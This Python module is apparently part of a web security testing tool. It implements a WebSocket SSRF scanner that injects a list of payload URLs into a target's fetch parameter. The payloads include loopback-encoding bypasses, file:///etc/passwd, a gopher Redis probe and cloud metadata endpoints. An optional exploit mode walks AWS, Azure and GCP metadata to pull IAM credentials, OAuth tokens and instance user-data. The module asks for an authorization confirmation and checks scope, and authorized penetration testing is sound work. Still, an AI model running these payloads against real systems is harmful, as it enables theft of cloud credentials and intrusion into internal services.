"""SSRF — internal-host probing + cloud metadata fetch.

Note: this is a *targeted* SSRF probe — the user provides a URL with a FUZZ
marker that the target server fetches; we test whether the marker can point
the server at internal/metadata endpoints.

WS  /ws/ssrf
    client -> server:
        {"url":"...FUZZ...", "method","body","headers","cookies",
         "allow_private":false, "rate_per_sec":5,
         "exploit":false, "confirm_auth":true}
"""
from __future__ import annotations

import asyncio
import logging
import time

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from lib import web_fuzz
from lib.errors import ErrorCode, MhpError, ws_error
from lib.validators import validate_url

logger = logging.getLogger(__name__)

router = APIRouter(tags=["ssrf"])

# Per-payload row: (label, payload-url, extra-headers, expected-sigs)
PAYLOADS: list[tuple[str, str, dict[str, str], list[str]]] = [
    ("loopback",        "http://127.0.0.1/", {}, ["server:", "<html"]),
    ("loopback-name",   "http://localhost/", {}, ["server:", "<html"]),
    ("zero",            "http://0.0.0.0/",   {}, ["server:", "<html"]),
    # IPv4 representation variants
    ("dec-int",         "http://2130706433/",        {}, ["server:", "<html"]),
    ("hex",             "http://0x7f000001/",        {}, ["server:", "<html"]),
    ("octal",           "http://0177.0.0.1/",        {}, ["server:", "<html"]),
    ("short",           "http://127.1/",             {}, ["server:", "<html"]),
    # AWS IMDS v1
    ("aws-imds-root",        "http://169.254.169.254/latest/meta-data/",
        {}, ["ami-id", "instance-id", "iam/"]),
    ("aws-imds-iam",         "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        {}, ["AccessKeyId", "SecretAccessKey", "Token"]),
    # AWS IMDSv2 (token required — most callers don't proxy headers, but try anyway)
    ("aws-imds-v2-token",    "http://169.254.169.254/latest/api/token",
        {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, ["AQAEA"]),
    # Azure
    ("azure-imds",     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        {"Metadata": "true"}, ["compute", "vmId", "subscriptionId"]),
    # GCP
    ("gcp-meta",       "http://metadata.google.internal/computeMetadata/v1/",
        {"Metadata-Flavor": "Google"}, ["instance/", "project/"]),
    ("gcp-token",      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        {"Metadata-Flavor": "Google"}, ["access_token", "Bearer"]),
    # Schemes
    ("file-passwd",    "file:///etc/passwd", {}, ["root:"]),
    ("gopher",         "gopher://127.0.0.1:6379/_INFO", {}, ["redis_version", "tcp_port"]),
    # DNS-based confirmation hint (not auto-confirmable here)
    ("dns-rebind",     "http://0.0.0.0.nip.io/", {}, []),
]


@router.websocket("/ws/ssrf")
async def ssrf_ws(ws: WebSocket) -> None:
    await ws.accept()
    stop = asyncio.Event()

    async def listen_for_stop() -> None:
        try:
            while True:
                msg = await ws.receive_json()
                if isinstance(msg, dict) and msg.get("action") == "stop":
                    stop.set(); return
        except Exception:
            stop.set()

    try:
        init = await ws.receive_json()
        url = str(init.get("url", "")).strip()
        try:
            url = validate_url(url, field="url")
        except MhpError as exc:
            await ws.send_json(ws_error(exc.code, exc.message))
            await ws.close(); return

        base_headers = dict(init.get("headers") or {})
        tmpl = web_fuzz.FuzzTemplate(
            url=url,
            method=str(init.get("method", "GET")).upper(),
            body=str(init.get("body", "")),
            headers=base_headers,
            cookies=dict(init.get("cookies") or {}),
        )
        if not tmpl.has_marker():
            await ws.send_json(ws_error(
                ErrorCode.BAD_REQUEST,
                f"Place '{web_fuzz.DEFAULT_MARKER}' where the SSRF URL parameter goes",
            ))
            await ws.close(); return
        if not bool(init.get("confirm_auth", False)):
            await ws.send_json(ws_error(
                ErrorCode.NEED_CONFIRM,
                "Confirm you have authorization to test this target",
            ))
            await ws.close(); return

        # `allow_private` here refers to the OUTER URL (target), not the
        # injected one — we always want to test internal-IP payloads.
        allow_private = bool(init.get("allow_private", False))
        ok, reason = web_fuzz.check_scope(url, allow_private)
        if not ok:
            await ws.send_json(ws_error(ErrorCode.TARGET_DENIED, reason))
            await ws.close(); return

        rate = max(1, min(int(init.get("rate_per_sec", 5)), 20))
        do_exploit = bool(init.get("exploit", False))

        await ws.send_json({"type": "started", "url": url,
                            "total_payloads": len(PAYLOADS)})

        listener = asyncio.create_task(listen_for_stop())
        t0 = time.monotonic()
        findings = 0
        confirmed_clouds: set[str] = set()

        # Run sequentially so we can adjust headers per payload (some need
        # specific headers to be added to the OUTER request).
        for i, (label, p_url, extra_hdrs, sigs) in enumerate(PAYLOADS):
            if stop.is_set():
                break
            local_tmpl = web_fuzz.FuzzTemplate(
                url=tmpl.url, method=tmpl.method, body=tmpl.body,
                headers={**tmpl.headers, **extra_hdrs},
                cookies=tmpl.cookies,
            )
            r = await web_fuzz.baseline(local_tmpl, sentinel=p_url, timeout=15.0)
            hit_sig = web_fuzz.contains_any(r.body, sigs) if sigs else None
            await ws.send_json({
                "type": "attempt", "label": label, "payload": p_url,
                "status": r.status, "length": r.length,
                "elapsed_ms": r.elapsed_ms, "hit": hit_sig,
            })
            if hit_sig:
                findings += 1
                if label.startswith("aws"):    confirmed_clouds.add("aws")
                if label.startswith("azure"):  confirmed_clouds.add("azure")
                if label.startswith("gcp"):    confirmed_clouds.add("gcp")
                await ws.send_json({
                    "type": "finding", "severity": "high", "label": label,
                    "payload": p_url, "evidence": r.body[:600],
                    "confirmed": True,
                })
            # Rate-limit between payloads
            await asyncio.sleep(1.0 / rate)

        # Exploit: walk IMDS recursively for whichever cloud was reachable
        if do_exploit and confirmed_clouds and not stop.is_set():
            for cloud in confirmed_clouds:
                if stop.is_set():
                    break
                if cloud == "aws":
                    paths = [
                        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                        "http://169.254.169.254/latest/dynamic/instance-identity/document",
                        "http://169.254.169.254/latest/user-data",
                    ]
                elif cloud == "azure":
                    paths = [
                        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                    ]
                else:  # gcp
                    paths = [
                        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
                    ]
                for p in paths:
                    extra = {"Metadata": "true"} if cloud == "azure" else (
                            {"Metadata-Flavor": "Google"} if cloud == "gcp" else {})
                    local_tmpl = web_fuzz.FuzzTemplate(
                        url=tmpl.url, method=tmpl.method, body=tmpl.body,
                        headers={**tmpl.headers, **extra}, cookies=tmpl.cookies,
                    )
                    r = await web_fuzz.baseline(local_tmpl, sentinel=p, timeout=20.0)
                    await ws.send_json({
                        "type": "finding", "severity": "high",
                        "label": f"{cloud}-exploit",
                        "payload": p, "evidence": r.body[:1200],
                        "confirmed": True,
                    })

        listener.cancel()
        await ws.send_json({"type": "done",
                            "elapsed": round(time.monotonic() - t0, 2),
                            "findings": findings,
                            "clouds": sorted(confirmed_clouds),
                            "stopped": stop.is_set()})
    except WebSocketDisconnect:
        stop.set()
    except Exception:
        logger.exception("ssrf_ws unhandled exception")
        try:
            await ws.send_json(ws_error(
                ErrorCode.INTERNAL,
                "internal error during SSRF scan",
            ))
        except Exception:
            pass
    finally:
        try:
            await ws.close()
        except Exception:
            pass
